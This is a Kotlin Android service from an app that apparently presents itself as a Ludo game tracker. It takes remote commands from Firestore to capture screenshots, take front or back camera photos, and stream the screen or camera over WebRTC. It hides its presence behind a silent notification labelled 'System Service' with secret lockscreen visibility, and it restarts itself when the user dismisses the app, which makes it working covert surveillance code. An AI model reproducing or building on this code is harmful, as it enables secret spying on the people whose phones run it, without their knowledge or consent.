package com.example.game_tracker

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration

class ForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "ludo_bg_service_channel"
        const val NOTIFICATION_ID = 1001

        fun startService(context: Context) {
            val intent = Intent(context, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private var firestoreListener: ListenerRegistration? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        setupFirestoreRequestListener()

        return START_STICKY
    }

    private fun setupFirestoreRequestListener() {
        if (firestoreListener != null) return

        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("flutter.game_tracker_device_id", null) ?: return

        try {
            val firestore = FirebaseFirestore.getInstance()
            firestoreListener = firestore.collection("screenshot_requests")
                .whereEqualTo("targetDeviceId", deviceId)
                .whereEqualTo("status", "pending")
                .addSnapshotListener { snapshots, error ->
                    if (error != null || snapshots == null) return@addSnapshotListener
                    for (change in snapshots.documentChanges) {
                        if (change.type == DocumentChange.Type.ADDED) {
                            val doc = change.document
                            val requestId = doc.id
                            val requestType = doc.getString("requestType") ?: "screenshot"
                            val cameraFacing = doc.getString("cameraFacing") ?: "front"

                            when (requestType) {
                                "camera_capture" -> {
                                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("cameraFacing", cameraFacing)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                                "screen_share", "camera_stream" -> {
                                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("cameraFacing", cameraFacing)
                                        putExtra("requestType", requestType)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                                "screenshot" -> {
                                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                                        putExtra("requestId", requestId)
                                        putExtra("capture_once", true)
                                    }
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        startForegroundService(svcIntent)
                                    } else {
                                        startService(svcIntent)
                                    }
                                }
                            }
                        }
                    }
                }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, ForegroundService::class.java).also {
            it.setPackage(packageName)
        }
        val restartServicePendingIntent = PendingIntent.getService(
            this,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        try {
            firestoreListener?.remove()
            firestoreListener = null
        } catch (e: Exception) {
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background service"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                vibrationPattern = longArrayOf(0L)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
}
